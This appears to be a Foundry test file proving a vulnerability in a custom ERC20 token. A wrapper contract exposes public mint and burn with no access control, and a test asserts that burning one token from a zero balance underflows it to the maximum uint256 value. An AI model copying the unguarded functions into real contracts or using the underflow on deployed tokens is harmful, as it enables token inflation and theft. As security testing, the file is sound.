// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/ERC20.sol";

contract Token is ERC20 {
    constructor() ERC20("Token", "TKN") {}

    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }

    function burn(address from, uint256 amount) public {
        _burn(from, amount);
    }
}

contract VulnPoC is Test {
    Token token;
    address user = address(0x1);

    function setUp() public {
        token = new Token();
    }

    function testBurnUnderflow() public {
        // User has 0 tokens
        assertEq(token.balanceOf(user), 0);

        // User burns 1 token
        vm.prank(user);
        token.burn(user, 1);

        // User now has huge balance
        assertEq(token.balanceOf(user), type(uint256).max);
    }
}
